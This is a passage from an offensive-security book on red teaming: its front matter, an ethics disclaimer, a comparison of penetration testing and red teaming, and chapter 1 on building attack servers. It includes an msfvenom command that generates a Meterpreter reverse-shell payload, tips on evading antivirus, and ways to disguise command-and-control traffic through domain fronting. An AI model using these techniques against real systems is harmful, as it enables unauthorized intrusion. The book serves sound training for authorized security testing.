{
  "raw_text": "\nTHE\nHACKER\nPLA YBOOK\n3\nPractical Guide to\nPenetration Testing\n \nRed Team Edition\nPeter Kim\n \n \n \n \nCopyright © 2018 by Secure Planet LLC. All rights reserved. Except as\npermitted under United States Copyright Act of 1976, no part of this\npublication may be reproduced or distributed in any form or by any means,\nor stored in a database or retrieval system, without the prior written\npermission of the author .\nAll rights reserved.\nISBN-13: 978-1980901754\n \nBook design and production by Peter Kim, Secure Planet LLC\nCover design by Ann Le\nEdited by Kristen Kim\n \nPublisher: Secure Planet LLC\nPublished: 1st May 2018\n \n \nDedication\n \nTo my wife Kristen, our new baby boy , our dog Dexter , and our families.\nThank you for all of your support and patience,\neven when you had no clue what I was talking about.\n \n \n \n \n \nContents\nPreface\nNotes and Disclaimer\nIntroduction\nPenetration T esting T eams vs Red T eams\nSummary\n1 Pregame - The Setup\nAssumed Breach Exercises\nSetting Up Y our Campaign\nSetting Up Y our External Servers\nTools of the T rade\nMetasploit Framework\nCobalt Strike\nPowerShell Empire\ndnscat2\np0wnedShell\nPupy Shell\nPoshC2\nMerlin\nNishang\nConclusion\n2 Before the Snap - Red T eam Recon\nMonitoring an Environment\nRegular Nmap Dif fing\nWeb Screenshots\nCloud Scanning\nNetwork/Service Search Engines\nManually Parsing SSL Certificates\nSubdomain Discovery\nGithub\nCloud\nEmails\nAdditional Open Source Resources\nConclusion\n3 The Throw - W eb Application Exploitation\nBug Bounty Programs:\nWeb Attacks Introduction - Cyber Space Kittens\nThe Red T eam W eb Application Attacks\nChat Support Systems Lab\nCyber Space Kittens:  Chat Support Systems\nSetting Up Y our W eb Application Hacking Machine\nAnalyzing a W eb Application\nWeb Discovery\nCross-Site Scripting XSS\nBlind XSS\nDOM Based XSS\nAdvanced XSS in NodeJS\nXSS to Compromise\nNoSQL Injections\nDeserialization Attacks\nTemplate Engine Attacks - T emplate Injections\nJavaScript and Remote Code Execution\nServer Side Request For gery (SSRF)\nXML eXternal Entities (XXE)\nAdvanced XXE - Out Of Band (XXE-OOB)\nConclusion\n4 The Drive - Compromising the Network\nFinding Credentials from Outside the Network\nAdvanced Lab\nMoving Through the Network\nSetting Up the Environment - Lab Network\nOn the Network with No Credentials\nResponder\nBetter Responder (MultiRelay .py)\nPowerShell Responder\nUser Enumeration W ithout Credentials\nScanning the Network with CrackMapExec (CME)\nAfter Compromising Y our Initial Host\nPrivilege Escalation\nPrivilege Escalation Lab\nPulling Clear T ext Credentials from Memory\nGetting Passwords from the W indows Credential Store and Browsers\nGetting Local Creds and Information from OSX\nLiving Of f of the Land in a W indows Domain Environment\nService Principal Names\nQuerying Active Directory\nBloodhound/Sharphound\nMoving Laterally - Migrating Processes\nMoving Laterally Of f Your Initial Host\nLateral Movement with DCOM\nPass-the-Hash\nGaining Credentials from Service Accounts\nDumping the Domain Controller Hashes\nLateral Movement via RDP over the VPS\nPivoting in Linux\nPrivilege Escalation\nLinux Lateral Movement Lab\nAttacking the CSK Secure Network\nConclusion\n5 The Screen - Social Engineering\nBuilding Y our Social Engineering (SE) Campaigns\nDoppelganger Domains\nHow to Clone Authentication Pages\nCredentials with 2F A\nPhishing\nMicrosoft W ord/Excel Macro Files\nNon-Macro Of fice Files - DDE\nHidden Encrypted Payloads\nExploiting Internal Jenkins with Social Engineering\nConclusion\n6 The Onside Kick - Physical Attacks\nCard Reader Cloners\nPhysical T ools to Bypass Access Points\nLAN T urtle (lanturtle.com)\nPacket Squirrel\nBash Bunny\nBreaking into Cyber Space Kittens\nQuickCreds\nBunnyT ap\nWiFi\nConclusion\n7 The Quarterback Sneak - Evading A V and Network Detection\nWriting Code for Red T eam Campaigns\nThe Basics Building a Keylogger\nSetting up your environment\nCompiling from Source\nSample Framework\nObfuscation\nTHP Custom Droppers\nShellcode vs DLLs\nRunning the Server\nClient\nConfiguring the Client and Server\nAdding New Handlers\nFurther Exercises\nRecompiling Metasploit/Meterpreter to Bypass AV and Network\nDetection\nHow to Build Metasploit/Meterpreter on W indows:\nCreating a Modified Stage 0 Payload:\nSharpShooter\nApplication Whitelisting Bypass\nCode Caves\nPowerShell Obfuscation\nPowerShell W ithout PowerShell:\nHideMyPS\nConclusion\n8 Special T eams - Cracking, Exploits, and T ricks\nAutomation\nAutomating Metasploit with RC scripts\nAutomating Empire\nAutomating Cobalt Strike\nThe Future of Automation\nPassword Cracking\nGotta Crack Em All - Quickly Cracking as Many as Y ou Can\nCracking the CyberSpaceKittens NTLM hashes:\nCreative Campaigns\nDisabling PS Logging\nWindows Download File from Internet Command Line\nGetting System from Local Admin\nRetrieving NTLM Hashes without T ouching LSASS\nBuilding T raining Labs and Monitor with Defensive T ools\nConclusion\n9 Two-Minute Drill - From Zero to Hero\n10 Post Game Analysis - Reporting\nContinuing Education\nAbout the Author\nSpecial Thanks\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \npreface\n \nThis is the third  iteration of The Hacker Playbook (THP) series.  Below is\nan overview of all the new vulnerabilities and attacks that will be\ndiscussed.  In addition to the new content, some attacks and techniques\nfrom the prior books (which are still relevant today) are included to\neliminate the need to refer back  to the prior books.  So, what's new?  Some\nof the updated topics from the past couple of years include:\nAbusing Active Directory\nAbusing Kerberos\nAdvanced W eb Attacks\nBetter W ays to Move Laterally\nCloud V ulnerabilities\nFaster/Smarter Password Cracking\nLiving Of f the Land\nLateral Movement Attacks\nMultiple Custom Labs\nNewer W eb Language V ulnerabilities\nPhysical Attacks\nPrivilege Escalation\nPowerShell Attacks\nRansomware Attacks\nRed T eam vs Penetration T esting\nSetting Up Y our Red T eam Infrastructure\nUsable Red T eam Metrics\nWriting Malware and Evading A V\nAnd so much more\n \nAdditionally , I have attempted  to incorporate all of the comments and\nrecommendations received from readers of the first and second books. I do\nwant to reiterate that I am not a professional author .   I just love security and\nlove teaching security and this is one of my passion projects.  I hope you\nenjoy it.\n \nThis book will also provide a more in-depth look into how to set up a lab\nenvironment in which to test your attacks, along with the newest tips and\ntricks of penetration testing. Lastly , I tried to make this version easier to\nfollow since many schools have incorporated my book into their curricula.  \nWhenever possible, I have added lab sections that help provide a way to test\na vulnerability or exploit.\n \nAs with the other two books, I try to keep things as realistic, or “real\nworld”, as possible.  I also try to stay away from theoretical attacks and\nfocus on what I have seen from personal experience and what actually\nworked.  I think there has been a major shift in the industry from\npenetration testers to Red Teamers, and I want to show  you rather than tell\nyou why this is so.  As I stated before, my passion is to teach and challenge\nothers.  So, my goals for you through this book are two-fold: first, I want\nyou to get into the mindset of an attacker and understand “the how” of the\nattacks; second,  I want you to take the tools and techniques you learn and\nexpand upon them.  Reading and repeating the labs is only one part – the\nmain lesson I teach to my students is to let your work speak for your talents.\n Instead of working on your resume (of course, you should have a resume),\nI really feel that having a strong public Github repo/technical blog speaks\nvolumes in security over a good resume.  Whether you live in the blue\ndefensive or red offensive world, getting involved and sharing with our\nsecurity community is imperative.\n \nFor those who did not read either of my two prior books, you might be\nwondering what my experience entails.  My background includes more than\n12 years of penetration testing/red teaming for major financial institutions,\nlarge utility companies, Fortune 500 entertainment companies, and\ngovernment organizations. I have also spent years teaching offensive\nnetwork security  at colleges, spoken at multiple security conferences, been\nreferenced in many security publications, taught courses all over the\ncountry , ran multiple public CTF competitions, and started my own security\nschool.  One of my big passion project was building a free and open\nsecurity comm unity in Southern California called LETHAL\n(meetup.com/lethal).  Now , with over 800+ members, monthly meetings,\nCTF competitio ns, and more, it has become an amazing environment for\npeople to share, learn, and grow .\n \nOne important note is that I am using both commercial and open source\ntools. For every commercial tool discussed, I try to provide an open source\ncounterpart. I occasionally run into some pentesters who claim  they only\nuse open source tools. As a penetration tester , I find this statement hard to\naccept. If you are supposed to emulate a “real world” attack, the “bad guys”\ndo not have these restrictions; therefore, you need to use any tool\n(commercial or open source) that will get the job done.\n \nA questi on I get often is, who is this book intended for?  It is really hard to\nstate for whom this book is specifically intended as I truly believe anyone in\nsecurity can learn.  Parts of this book might be too advanced for novice\nreaders, some parts might be too easy for advanced hackers, and other parts\nmight not even be in your field of security . \n \nFor those who are just getting into security , one of the most common things\nI hear from readers is that they tend to gain the most benefit from the books\nafter reading them for the second or third time (making sure to leave\nadequate time between reads).  There is a lot of material thrown at you\nthroughout this book and sometimes it takes time to absorb it all.  So, I\nwould say relax,  take a good read, go through the labs/examples , build your\nlab, push your scripts/code to a public Github repository , and start up a\nblog.\n \nLastly , being a Red Team member is half about technical ability and half\nabout having confidence.  Many of the social engineering exercises require\nyou to overcom e your nervousness and go outside your comfort zone. \nDavid Letterma n said it best, \"Pretending to not be afraid is as good as\nactually not being afraid.\"  Although this should be taken with a grain of\nsalt, sometimes you just have to have confidence, do it, and don't look back.\nNotes and Disclaimer\nI can't reiterate this enough: Do not go looking for vulnerable servers and\nexploits on systems you don't own without the proper approval.  Do not try\nto do any of the attacks in this book without the proper approval.  Even if it\nis for curiosity versus malicious intent, you can still get into a lot of trouble\nfor these actions.  There are plenty of bug bounty programs and vulnerable\nsites/VMs to learn off of in order to continue growing.  Even for some bug\nbounty programs, breaking scope or going too far can get you in trouble:\nhttps://www .forbes.com/sites/thomasbrewster/2015/12/17/faceb\nook-instagram-security-research-threats/#c3309902fb52\nhttps://nakedsecurity .sophos.com/2012/02/20/jail-facebook-\nethical-hacker/\nhttps://www .cyberscoop.com/dji-bug-bounty-drone-technology-\nsean-melia-kevin-finisterre/\n \nIf you ever feel like it's wrong,  it's probably wrong and you should ask a\nlawyer or contact the Electronic Frontier Foundation (EFF)\n(https://www .eff.org/pages/legal-assistance).  There is a fine line between\nresearch and illegal activities. \n \nJust remember , ONL Y test systems on which you have written permission.\nJust Google the term “hacker jailed” and you will see plenty of different\nexamples where young teens have been sentenced to years in prison for\nwhat they thoug ht was a “fun time.” There are many free platforms where\nlegal hacking is allowed and will help you further your education.\n \nFinally , I am not an expert in W indows, coding, exploit dev , Linux, or really\nanything else.  If I misspoke about a specific technology , tool, or process, I\nwill make sure to update the Hacker Playbook Updates webpage\n(thehackerplaybook.com/updates) for anything that is reported as incorrect. \nAlso, much of my book relies on other people's research in the field, and I\ntry to provide links to their original work whenever possible.  Again, if I\nmiss any of them, I will update the Updates webpage with that information. \nWe have  such an awesome community and I want to make sure everyone\ngets acknowledged for their great work!\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nintroduction\n \n \n \n \nIn the last enga gement (The Hacker Playbook 2), you were tasked with\nbreaking into the Cyber Kittens  weapons facility .  They are now back with\ntheir brand new space division  called Cyber Space Kittens (CSK).  This\nnew division took all the lessons  learned from the prior security  assessment\nto harden their systems, set up a local security operations center , and even\ncreate security policies.  They have hired you to see if all of their security\ncontrols have helped their overall posture.\n \nFrom the little details we have picked up, it looks like Cyber Space Kittens\nhas discovered a secret planet located in the Great Andromeda Nebula or\nAndromeda Galaxy .  This planet, located on one of the two spiral arms, is\nreferred to as KITT-3n.  KITT -3n, whose size is double that of Earth,\nresides in the binary system called OI 31337 with a star that is also twice\nthe size of Earth’s star.  This creates a potentially habitable environment\nwith oceans, lakes, plants, and maybe even life…\n \nWith the hope of new life, water , and another viable planet, the space race is\nreal.  CSK has hired us to perform a Red Team assessment to make sure\nthey are secure,  and capable of detecting and stopping a breach.  Their\nmanagement has seen and heard of all the major breaches in the last year\nand want to hire only the best.  This is where you come in...\n \nYour mission, if you choose to accept it, is to find all the external and\ninternal vulnerabilities, use the latest exploits, use chained vulnerabilities,\nand see if their defensive teams can detect or stop you. \n \nWhat types of tactics, threats, and procedures are you going to have to\nemploy?  In this campaign, you are going to need to do a ton of\nreconnaissance and discovery , look for weaknesses in their external\ninfrastructure, social engineer employees, privilege escalate, gain internal\nnetwork information, move laterally throughout the network, and ultimately\nexfiltrate KITT -3n systems and databases.\n \nPenetration Testing Teams vs Red Teams\nBefore we can dive into the technical ideals behind Red Teams, I need to\nclarify my definitions of Penetration Testing and Red Teams.  These words\nget thrown around often and can get a little mixed up.  For this book, I want\nto talk about how I will use these two terms.\n \nPenetration Testing  is the more rigorous and methodical testing of a\nnetwork, application, hardware, etc.  If you haven’ t already , I recommend\nthat you read the Penetration Testing Execution Standard (PTES:\nhttp://www .pentest-standard.or g) – it is a great walkthrough of how to\nperform an assessment.  In short, you go through all the motions of\nScoping, Intel Gathering, Vulnerability Analysis, Exploitation, Post\nExploitation, and Reporting.  In the traditional network test, we usually\nscan for vulnerabilities, find and take advantage of an exploitab le system or\napplication, maybe do a little post exploitation, find domain admin, and\nwrite up a report.  These types of tests create a matrix of vulnerabilities,\npatching issues , and very actionable results.  Even during the scope\ncreation, penetration tests are very well defined, limited to a one or two-\nweek assessment period, and are generally announced to the company’ s\ninternal security  teams. Companies still need penetration testers to be a part\nof their secure software development life cycle (S-SDLC).\n \nNowadays, even though companies have vulnerability management\nprograms, S-SDLC programs, penetration testers, incident response\nteams/programs, and many of the very expensive security tools, they still\nget compromised.  If we look at any of the recent breaches\n(http://www .informationisbeautiful.net/visualizations/worlds-biggest-data-\nbreaches-hacks), we see that many of these happened to very large and\nmature companies.   We have seen in other security reports that some\ncompromises could have lasted longer than 6 months before they were\ndetected (https://en.wikipedia.or g/wiki/Sony_Pictures_hack).  There are\nalso some reports that state that almost one-third of all businesses were\nbreached in 2017 (https://www .esecurityplanet.com/network-\nsecurity/almost-a-third-of-all-u.s.-businesses-were-breached-in-2017.html). \nThe questions I want companies  to ask are if these exact same bad guys or\nactor sets came after your company with the exact same tactics, could you\ndetect it, how long would it take, could you recover from it, and could you\nfigure out exactly what they did?\n \nThis is where Red Teams  come into play.  The Red Team’ s mission is to\nemulate the tactics, techniques, and procedures (TTPs) by adversaries.  The\ngoals are to give real world and hard facts on how a company will respond,\nfind gaps within a security program, identify skill gaps within employees,\nand ultimately increase their security posture. \n \nFor Red Teams, it is not as methodical as penetration tests.  Since we are\nsimulating real world events, every test can differ significantly .  Some\ncampaigns might have a focus on getting personally identifiable\ninformation (PII) or credit cards, while others might focus on getting\ndomain adminis trative control.  Speaking of domain admin, this where I see\na huge difference between Penetration Tests and Red Team campaigns.  For\nnetwork pentests , we love gettin g to Domain Admin (DA) to gain access to\nthe Domain Controller (DC) and calling it a day.  For Red Team campaigns,\nbased on the campaign, we may ignore the DC completely .  One reason for\nthis is that we are seeing many companies placing a lot of protec tion around\ntheir DCs.  They might have application whitelisting, integrity monitoring,\nlots of IDS/IPS/HIPS rules, and even more.  Since our mission is not to get\ncaught, we need to stay low key.  Another rule we follow is that we almost\nnever run a vulnerability scan against the internal network.  How many\nadversaries have you seen start to perform full vulnerability scans once\ninside a compromised environ ment?  This is extremely rare.  Why? \nVulnerability scans are very loud on the network and will most likely get\ncaught in today’ s world. \n \nAnother major difference in the scope is the timeline.  With penetration\ntests, we are lucky to get two weeks, if not one.  Whereas, Red Teams must\nbuild campaigns  that last from 2 weeks to 6 months.  This is because we\nneed to simulate real attacks, social engineering, beaconing, and more. \nLastly , the largest difference is the outcome of the two types of teams. \nInstead of a list of vulnerabilities, Red Team findings need to be geared\nmore toward gaps in blue team processes, policies, tools, and skills.  In your\nfinal report, you may have some vulnerability findings that were used for\nthe campaign, but most findings will be gaps in the security program. \nRemember findings should be mainly for the security program, not IT .\n \nPenetration T ests Red T eams\nMethodical Security Assessments:\nPre-engagement\nInteractions\nIntelligence Gathering\nVulnerability Analysis\nExploitation\nPost Exploitation\nReporting\n Flexible Security Assessments:\nIntelligence Gathering\nInitial Foothold\nPersistence/Local\nPrivilege Escalation\nLocal/Network\nEnumeration\nLateral Movement\nData\nIdentification/Exfiltration\nDomain Privilege\nEscalation/Dumping\nHashes\nReporting\nScope:\nRestrictive Scope\n1-2 W eek Engagement\nGenerally Announced\nIdentify vulnerabilitiesScope:\nNo Rules*\n1 Week – 6 Month\nEngagement\nNo announcement\nTest Blue teams on\nprogram, policies, tools,\nand skills\n*Can’ t be illegal…\n \nWith Red Teams, we need to show value back to the company .  It isn’t\nabout the number of total vulnerability counts or criticality of individual\nvulnerabilities; it is about proving how the security program is running. \nThe goal of the Red Team is to simulate real world events that we can\ntrack.  Two strong metrics that evolve from these campaigns are Time To\nDetect (TTD) and Time To Mitigate (TTM).  These are not new concepts,\nbut still valuable ones for Red T eams. \n \nWhat does Time To Detect (TTD) mean?  It is the time between the initial\noccurrence of the incident to when an analyst detects and starts working on\nthe incid ent.  Let’s say you have a social engineering email and the user\nexecutes malware on their system.  Even though their AV, host-based\nsecurity system , or monitoring tools might trigger , the time recorded is\nwhen the analyst creates that first ticket. \n \nTime To Mitigate (TTM) is the secondary metric to record.  This timeline is\nrecorded when the firewall block, DNS sinkhole, or network isolation is\nimplemented.  The other valuable information to record is how the Security\nTeams work with IT, how management handles a critical incident, and if\nemployees panic.  With all this data, we can build real numbers on how\nmuch your company is at risk, or how likely it is to be compromised. \n \nS u m m a r y\nThe big push I want to make is for managers to get outside the mentality of\nrelying on metrics from audits.   We all have reasons for compliance and\nthey can definitely help mature our programs, but they don't always provide\nreal world security for a company .  As Red Teamers, our job is to test if the\noverall security program is working.\n \nAs you read through this book, I want you to put yourself in the Red Team\nmindset and focus on:\nVulnerabilities in Security not IT\nSimulate Real W orld events\nLive in a world of constant Red T eam infections\n \nChallenge the system…  Provide r eal data to prove security gaps.\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n1 pregame - the setup\n \n \n \n \n \n \nAs a Red Team,  we don’t really care as much about the origins of an attack.\nInstead, we want to learn from the TTPs.  For example, looking at public\nsources, we found a detailed report from FireEye on an attack they analyzed\n(https://www2.fireeye.com/rs/848-DID-242/images/rpt-apt29-\nhammertoss.pdf).  Reviewing their analysis, we can see that the TTPs of the\nmalware used Twitter as part of the Command and Control (C2), images\nwith encryption keys, GitHub, and steganography .  This is where we would\nbuild a similar campaign to see if your company could detect this attack.\n \nA detailed breakdown for APT  attacks is MITRE’ s Adversarial Tactics,\nTechniques, and Common Knowledge (ATT&CK) matrix.  This is a large\ncollection of dif ferent TTPs commonly used with all sorts of attacks.\n \n \nAnother resource is this running list of APT Groups and Operations\ndocument from @cyb3rops.  This Google Document\n(http://bit.ly/2GZb8eW) breaks down different suspected APT groups and\ntheir toolsets.  This is a usefu l list for us as Red Teamers to simulate\ndifferent attack s.  Of course,  we might not use the same tools as\ndocumented in the reports, but we may build similar tools that will do the\nsame thing.\n \n \nAssumed Breach Exercises\nCompanies need to live in a world today where they start with the\nassumption that they have already been breached.  These days, too many\ncompanies assume that because  of some check box or annual penetration\ntest, they are secure.  We need to get in a state of mind where we are always\nhunting, assuming evil is lurking around, and looking for these anomalies. \n \nThis is where Red Team campaigns heavily differ from penetration tests. \nSince Red Team campaigns focus on detection/mitigation instead of\nvulnerabilities, we can do some more unique assessments.  One assessment\nthat provides customers/clients with immense benefit is called an assumed\nbreach exercise.  In an assumed  breach exercise, the concept is that there\nwill always be 0-days.  So, can the client identify and mitig ate against\nsecondary and tertiary steps?\n \nIn these scenarios, Red Teams work with a limited group of people inside\nthe company to get a single custom malware payload to execute on their\nserver .  This payload should try to connect out in multiple ways, make sure\nto bypass common AV, and allow for additional payloads to be executed\nfrom memory .  We will have example payloads throughout the book.  Once\nthe initial payload is executed, this is where all the fun begins!\n \nSetting Up Your Campaign\nThis is one of my favorite parts of running Red Teams.  Before you\ncompromise your first system,  you need to scope out your Red Team\ncampaign.  In a lot of penetra tion tests, you are given a target and you\ncontinually try to break into that single system.  If something fails, you go\non to the next thing.  There is no script and you are usually pretty focused\non that network.\n \nIn Red Team campaigns, we start out with a few objectives.  These\nobjectives can include, but are not limited to:\nWhat are the end goal goals?  Is it just APT detection?  Is it to\nget a flag on a server? Is it to get data from a database? Or is it\njust to get TTD metrics?\nIs there a public campaign we want to copy?\nWhat techniques are you going to use?  We talked about using\nMITRE ATT&CK Matrix, but what are the exact techniques in\neach category? \nThe team at Red Canary supplied detailed information\non each one of these techniques .  I highly recommend\nyou take time and review them all: \nhttp://bit.ly/2H0MTZA\nWhat tools does the client want you to use?  Will it be COTS\noffensive tools like Metasploit , Cobalt Strike, DNS Cat?  Or\ncustom tools?\n \nThe best part is that getting caught is part of the assessment.  There are\nsome campaigns where we get caught 4 or 5 times and have to burn 4 or 5\ndifferent environments.  This really shows to your client that their defenses\nare working (or not working) based on what results they expected.  At the\nend of the book,  I will provide some reporting examples of how we capture\nmetrics and report that data.\n \nSetting Up Your External Servers\nThere are many  different services that we use for building our campaigns. \nIn today 's world with the abundance of Virtual Private Servers (VPS),\nstanding up your attacker machines on the internet won't break your\nbudget.   For example, I commonly use Digital Ocean Droplets\n(https://www .digitalocean.com/products/compute) or Amazon W eb Services\n(AWS) Lightsail servers (https:/ /lightsail.aws.amazon.com) to configure my\nVPS servers.  The reasons I use these services are because they are\ngenerally very low cost (someti mes free), allow for Ubuntu servers, allow\nfor servers in all sorts of regions, and most importantly , are very easy to set\nup.  Within minutes, you can have multiple servers set up and running\nMetasploit and Empire services.\n \nI am going to focus on AWS Lightsail servers in this book, due to the ease\nin settin g up, ability to autom ate services, and the amount of traffic\nnormally going to AWS.  After you have fully created an image you like,\nyou can rapidly clone that image to multiple servers, which makes it\nextremely easy to build ready-made Command and Control boxes.\n \nAgain, you shou ld make sure you abide by the VPS provider's service terms\n(i.e. https://aws.amazon.com/service-terms/) so you do not fall into any\nproblems.\n \nhttps://lightsail.aws.amazon.com/\nCreate an Instance\nI highly recommend getting at least 1 GB of RAM\nStorage space usually isn't an issue\nLinux/Unix\nOS Only -> Ubuntu\nDownload Cert\nchmod 600 cert\nssh -i cert ubuntu@[ip] \n \nOnce you are logged into your server , you need to install all the tools as\nefficiently and repeatable as possible.  This is where I recommend that you\ndevelop your own scripts to set up things such as IPTables rules , SSL certs,\ntools, scripts, and more.  A quick way to build your servers is to integrate\nTrustedSec's The PenT esters Framework (PTF).  This collectio n of scripts\n(https://github.com/trustedsec/ptf) does a lot of the hard work for you and\ncreates a framework for everything else.  Let's walk through a quick\nexample of installing all of our exploitation, intel gathering, post\nexploitation, PowerShell, and vulnerability analysis tools.\nsudo su -\napt-get update\napt-get install python\ngit clone https://github.com/trustedsec/ptf /opt/ptf\ncd /opt/ptf && ./ptf\nuse modules/exploitation/install_update_all\nuse modules/intelligence-gathering/install_update_all\nuse modules/post-exploitation/install_update_all\nuse modules/powershell/install_update_all\nuse modules/vulnerability-analysis/install_update_all\ncd /pentest\n \nThe following image shows all the different modules available, some of\nwhich we installed.\n \nImage of all available modules\n \nIf we take a look at our attacker VPS, we can see all of the tools installed on\nour box.  If we wanted to start up Metasploit, we can just type: msfconsole .\n \nAll tools installed under /pentest\n \nOne thing I still recommend is setting up strong IPTables rules .  Since this\nwill be your attacker server , you will want to limit where SSH\nauthentications can initiate from, where Empire/Meterpreter/Cobalt Strike\npayloads can come from, and any phishing pages you stand up.\n \nIf you remembe r back in late 2016, someone had found an unauthenticated\nRemote Code Execution (RCE) on Cobalt Strike Team Server\n(https://blog.cobaltstrike.com/2016/09/28/cobalt-strike-rce-active-\nexploitation-reported/).  You definitely don't want your attacker servers\ncompromised with your customer's data.\n \nI have also seen some Red Teams run Kali Linux (or at least Metasploit) in\nDocker inside AWS (http://bit.ly/2qz2vN9).  From my point of view , there\nis no wrong way to create your systems.  What you do want is to create an\nefficient and repeatable process to deploy multiple machines.  The best part\nof using Lightsail is that once you have your machine configured to your\npreferences, you can take a snapshot of a machine and stand up multiple,\nbrand new instances of that image. \n \nIf you want to get your environment to the next level, check out the team at\nCoalfire-Research.  They built custom modules to do all the hard work and\nautomation for you.  Red Baron is a set of modules and custom/third-party\nproviders for Terraform, which  tries to automate the creation of resilient,\ndisposable, secure, and agile infrastructure for Red Teams\n[https://github.com/Coalfire-Research/Red-Baron].  Whether you want to\nbuild a phishing server , Cobalt Strike infrastructure, or create a DNS C2\nserver , you can do it all with T erraform. \n \nTake a look at https://github.co m/Coalfire-Research/Red-Baron and check\nout all the dif ferent modules to quickly build your own infrastructure.\n \nTools of the Trade\nThere are a myriad of tools a Red Team might use, but let’s talk about some\nof the core resou rces.  Remember that as a Red Teamer , the purpose is not\nto compromise an environment (which is the most fun), but to replicate real\nworld attacks to see if a customer is protected and can detect attacks in a\nvery short timeframe.  In the previous chapters, we identified how to\nreplicate an attacker's profile and toolset, so let’s review over some of the\nmost common Red T eam tools.\nMetasploit Framework\nThis book won't dive too deeply  into Metasploit as it did in the prior books. \nMetasploit Framework is still a gold standard tool even though it was\noriginally develo ped in 2003.  This is due to both the original creator , H.D.\nMoore, and the very active community that supports it.  This community-\ndriven framework (https://github.com/rapid7/metasploit-\nframework/commits/master), which seems to be updated daily , has all of the\nlatest public exploits, post exploitation modules, auxiliary modules, and\nmore. \n \nFor Red Team engagements, we might use Metasploit to compromise\ninternal systems with the MS17-010 Eternal Blue Exploit\n(http://bit.ly/2H2PT sI) to get our first shell or we might use Metasploit to\ngenerate a Meterpreter payload for our social engineering attack. \n \nIn the later chapters, we are going to show you how to recompile your\nMetasploit payloads and traf fic to bypass A V and network sensors.\nObfuscating Meterpr eter Payloads\nIf we are performing some social engineering attack, we might want to use\na Word or Excel document as our delivery mechanism.  However , a\npotential problem is that we might not be able to include a Meterpreter\npayload binary or have it download one from the web, as AV might trigger\non it.  Also, a simple solution is obfuscation using PowerShell:\nmsfvenom --payload windows/x64/meterpreter_reverse_http --\nformat psh --out meterpreter -64.ps1 LHOST=127.0.0.1\n \nWe can even take this to the next level and use tools like Unicorn\n(https://github.com/trustedsec/unicorn) to generate more obfuscated\nPowerShell Meterpreter payloads, which we will be covered in more detail\nas we go through the book.\n \n \nAdditionally , using signed SSL/TLS certificates by a trusted authority could\nhelp us get around certain network IDS tools: \nhttps://github.com/rapid7/metasploit-framework/wiki/Meterpreter -\nParanoid-Mode.\n \nFinally , later in the book, we will go over how to re-compile\nMetasploit/Meterpreter from scratch to evade both host and network based\ndetection tools.\n \nCobalt Strike\nCobalt Strike is by far one of my favorite Red Team simulation tools.  What\nis Cobalt Strike? It is a tool for post exploitation, lateral movement, staying\nhidden in the network, and exfiltration.  Cobalt Strike doesn't really have\nexploits and isn't used for compromising a system via the newest 0-day\nvulnerability .  Where you really see its extensive features and powers is\nwhen you already have code execution on a server or when it is used as part\nof a phishing campaign payload.  Once you can execute a Cobalt Strike\npayload, it creates a Beacon connection back to the Command and Control\nserver .\n \nNew Cobalt Strike licenses cost $3,500 per user for a one-year license, so it\nis not a cheap tool to use.  There is a free limited trial version available.\nCobalt Strike Infrastructur e\nAs mentioned earlier , in terms of infrastructure, we want to set up an\nenvironment that is reusable and highly flexible.  Cobalt Strike supports\nredirectors so that if your C2 domain is burned, you don't have to spin up a\nwhole new environment, only a new domain.  You can find more on using\nsocat to configure these redirectors here: http://bit.ly/2qxCbCZ and\nhttp://bit.ly/2IUc4Oe.\n \n \nTo take your redirectors up a notch, we utilize Domain Fronting.  Domain\nFronting is a collection of techniques to make use of other people’ s domains\nand infrastructures as redirectors for your controller\n(http://bit.ly/2GYw55A).  This can be accomplished by utilizing popular\nContent Deliver y Networks (CDNs) such as Amazon’ s CloudFront or other\nGoogle Hosts to mask traffic origins.  This has been utilized in the past by\ndifferent adversaries (http://bit.ly/2HoCRFi).  \n \nUsing these high reputation domains, any traffic, regardless of HTTP or\nHTTPS, will look like it is communicating to these domains instead of our\nmalicious Command and Contro l servers.  How does this all work?  Using a\nvery high-level example, all your traffic will be sent to one of the primary\nFully Qualified Domain Names (FQDNs) for CloudFront, like\na0.awsstatic.com, which is CloudFront's primary domain.  Modifying the\nhost header in the request will redirect all the traffic to our CloudFront\ndistribution, which will ultimate ly forward the traffic to our Cobalt Strike\nC2 server (http://bit.ly/2GYw55A ).\n \n \nBy changing the HTTP Host header, the CDN will happily route us to the\ncorrect server . Red Teams have been using this technique for hiding C2\ntraffic by using high reputation redirectors.\n \nTwo other great resources on different products that support Domain\nFronting:\nCyberArk also wrote an excellent blog on how to use Google\nApp products to look like your traf fic is flowing through\nwww .google.com, mail.google.com, or docs.google.com here:\nhttp://bit.ly/2Hn7R W4.\nVincent Y iu wrote an article on how to use Alibaba CDN to\nsupport his domain fronting attacks: http://bit.ly/2HjM3eH.\nCobalt Strike isn't the only tool that can support Domain\nFronting, this can also be accomplished with Meterpreter\nhttps://bitrot.sh/post/30-1 1-2017-domain-fronting-with-\nmeterpreter/.\n \nNote: At the time of publishing this book, AWS (and even Google) have\nstarting implementing protections against domain fronting\n(https://amzn.to/2I6lSry).  This doesn't stop this type of attack, but would\nrequire dif ferent third party resources to abuse.\n \nAlthough not part of the infras tructure, it is important to understand how\nyour beacons work within an internal environment.  In terms of operational\nsecurity , we don’t want to build a campaign that can be taken out easily .  As\na Red Teamer , we have to assume that some of our agents will be\ndiscovered by the Blue Team.  If we have all of our hosts talking to one or\ntwo C2 endpoints, it would be pretty easy to take out our entire\ninfrastructure.  Luckily for us, Cobalt Strike supports SMB Beacons\nbetween hosts for C2 communication.  This allows you to have one\ncompromised machine communicate to the internet, and all other machines\non the network to communicate  through the initial compromised host over\nSMB (https://www .cobaltstrike.com/help-smb-beacon).  This way, if one of\nthe secondary systems is detected and forensics analysis is performed, they\nmight not be able to identify the C2 domain associated with the attack.\n \nA neat feature of Cobalt Strike that immensely helps Red Teams is its\nability to manipulate how your Beacons communicate.  Using Malleable C2\nProfiles, you can have all your traffic from your compromised systems look\nlike norm al traffic.  We are getting into more and more environments where\nlayer 7 applicati on filtering is happening.  In layer 7, they are looking for\nanomalous traffic that many times this is over web communicati on.  What if\nwe can make our C2 communication look like normal web traffic?  This is\nwhere Malleable  C2 Profiles come into play.  Take a look at this example:\nhttps://github.com/rsmudge/Malleable-C2-\nProfiles/blob/master/normal/amazon.profile.  Some immediate notes:\n \nWe see that these 